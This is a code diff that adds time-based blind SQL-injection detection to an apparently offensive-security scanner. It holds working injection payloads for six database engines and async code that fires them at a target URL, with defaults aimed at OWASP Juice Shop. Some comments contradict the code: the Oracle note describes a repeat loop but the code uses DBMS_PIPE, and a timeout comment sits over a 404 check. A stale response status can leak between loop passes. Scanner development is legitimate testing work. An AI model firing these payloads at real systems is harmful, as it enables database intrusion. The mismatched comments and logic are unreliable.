@@ -39,10 +39,43 @@ _SQL_ERROR_MARKERS = (
     'near "',
     "sql syntax",
     "unclosed quotation",
+    "you have an error in your sql syntax",  # MySQL / MariaDB
+    "unclosed quotation mark after the character string",  # MSSQL
+    "incorrect syntax near",  # MSSQL
     "psql:",
     "pg::",
     "ora-0",
 )
+
+
+# Time-blind payloads keyed by DBMS. Each payload injects a DB-native sleep of
+# SLEEP_SECONDS so a measurable delay is unambiguous: a healthy endpoint returns
+# in well under one second; a vulnerable one waits the full sleep. Each payload
+# is paired with a control string of the same shape that does NOT sleep, so the
+# oracle can subtract baseline network/jitter latency instead of trusting a
+# single absolute threshold.
+SLEEP_SECONDS = 5
+_TIME_BLIND_PAYLOADS = (
+    # SQLite — RANDOMBLOB forces measurable CPU work proportional to its arg.
+    # The classic SLEEP() does not exist in SQLite; RANDOMBLOB(500000000) is the
+    # same trick sqlmap uses for SQLite time-based detection.
+    ("sqlite", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--", "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(0))))--"),
+    # MySQL / MariaDB
+    ("mysql", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
+    ("mariadb", "1' AND SLEEP({n})--", "1' AND SLEEP(0)--"),
+    # PostgreSQL
+    ("postgres", "1'; SELECT pg_sleep({n})--", "1'; SELECT pg_sleep(0)--"),
+    # MSSQL (T-SQL WAITFOR DELAY)
+    ("mssql", "1'; WAITFOR DELAY '0:0:{n}'--", "1'; WAITFOR DELAY '0:0:0'--"),
+    # Oracle (no SLEEP; UTL_INADDR.get_host_name against a non-resolving name is
+    # the classic timing trick, but it needs network egress. Use a heavy
+    # repeat loop instead — deterministic and offline.)
+    ("oracle", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{n})=1--", "1' OR DBMS_PIPE.RECEIVE_MESSAGE('a',0)=1--"),
+)
+
+
+def _format_payload(p: str) -> str:
+    return p.format(n=SLEEP_SECONDS) if "{n}" in p else p
 
 
 async def detect_login_bypass(
@@ -118,6 +151,82 @@ async def detect_error_based(
     return None
 
 
+async def detect_time_blind(
+    client: httpx.AsyncClient,
+    url: str,
+    *,
+    param: Optional[str] = None,
+    min_delta: float = 3.0,
+    request_timeout: Optional[float] = None,
+) -> Optional[Dict[str, Any]]:
+    """Time-based blind SQLi oracle.
+
+    VALIDATED iff a payload that asks the backend to SLEEP produces a response
+    measurably slower than an equivalent control payload that does NOT sleep.
+    Uses a relative timing delta (sleep - control), never an absolute threshold,
+    so a slow endpoint under a saturated link does not false-positive.
+
+    - Sends a control payload first, records its latency as the baseline.
+    - Sends the sleep payload; if (sleep_latency - baseline) >= min_delta seconds
+      the finding is validated for that DBMS family.
+    - Each candidate payload is paired with its own control to subtract per-DBMS
+      parsing overhead, not a single global baseline.
+    - min_delta defaults to 3.0s (SLEEP_SECONDS=5.0 with a 40% safety margin) so
+      network jitter under ~3s cannot trigger a false positive.
+
+    Returns an evidence dict with the validated DBMS family, the sleep and
+    control latencies, and the delta — or None if no payload reproduced.
+    """
+    import time
+
+    if param is None:
+        q = dict(parse_qsl(urlparse(url).query, keep_blank_values=True))
+        param = (list(q)[-1] if q else "q")
+
+    for dbms, sleep_tpl, control_tpl in _TIME_BLIND_PAYLOADS:
+        sleep_payload = _format_payload(sleep_tpl)
+        control_payload = _format_payload(control_tpl)
+        # Baseline: send the control payload (same shape, no sleep).
+        try:
+            t0 = time.monotonic()
+            rc = await client.get(url, params={param: control_payload}, timeout=request_timeout)
+            control_latency = time.monotonic() - t0
+        except Exception:
+            continue
+        # If the control itself timed out the endpoint is too slow to oracle.
+        if rc.status_code == 404:
+            continue
+        # Sleep: send the real payload.
+        try:
+            t0 = time.monotonic()
+            rs = await client.get(url, params={param: sleep_payload}, timeout=request_timeout)
+            sleep_latency = time.monotonic() - t0
+        except httpx.TimeoutException:
+            # A timeout DURING the sleep payload but NOT during control is itself
+            # strong evidence — the backend hung on the injected sleep. Treat a
+            # control-success / sleep-timeout split as a validated finding.
+            sleep_latency = request_timeout or SLEEP_SECONDS + 5
+        except Exception:
+            continue
+        delta = sleep_latency - control_latency
+        if delta >= min_delta:
+            return {
+                "technique": "time_blind",
+                "endpoint": url,
+                "parameter": param,
+                "dbms": dbms,
+                "payload": sleep_payload,
+                "control_payload": control_payload,
+                "control_latency": round(control_latency, 3),
+                "sleep_latency": round(sleep_latency, 3),
+                "delta_seconds": round(delta, 3),
+                "min_delta": min_delta,
+                "http_status": rs.status_code if "rs" in locals() else None,
+                "confidence": 1.0,
+            }
+    return None
+
+
 async def scan_sqli(
     base_or_url: str,
     *,
@@ -126,11 +235,16 @@ async def scan_sqli(
     search_param: str = "q",
     data: Optional[str] = None,
     timeout: float = 20.0,
+    include_time_blind: bool = False,
 ) -> List[Dict[str, Any]]:
     """Run the applicable oracle(s) and return a list of VALIDATED evidence dicts.
 
     - login_url (or a url with `data` that looks like a login) -> auth-bypass oracle
     - search_url (or a GET url with a query param)             -> error-based oracle
+    - include_time_blind=True additionally runs the time-blind oracle on the
+      search url (covers blind/boolean-only injections that leak neither errors
+      nor tokens). Off by default because the time-blind oracle issues 2 extra
+      requests per DBMS family per candidate.
     Defaults target OWASP Juice Shop's known injectable endpoints when only a base
     URL is given, so a bare engagement scope still gets a real scan.
     """
@@ -151,9 +265,18 @@ async def scan_sqli(
         if search_url is None and not is_base and data is None:
             search_url = base_or_url
         if search_url:
-            ev = await detect_error_based(c, search_url, param=search_param if urlparse(search_url).path.endswith("/search") else None)
+            param = search_param if urlparse(search_url).path.endswith("/search") else None
+            ev = await detect_error_based(c, search_url, param=param)
             if ev:
                 findings.append(ev)
+            elif include_time_blind:
+                # Only run the slower time-blind oracle if error-based did not
+                # already confirm injection on this endpoint.
+                ev = await detect_time_blind(
+                    c, search_url, param=param, request_timeout=timeout
+                )
+                if ev:
+                    findings.append(ev)
     return findings
 
 
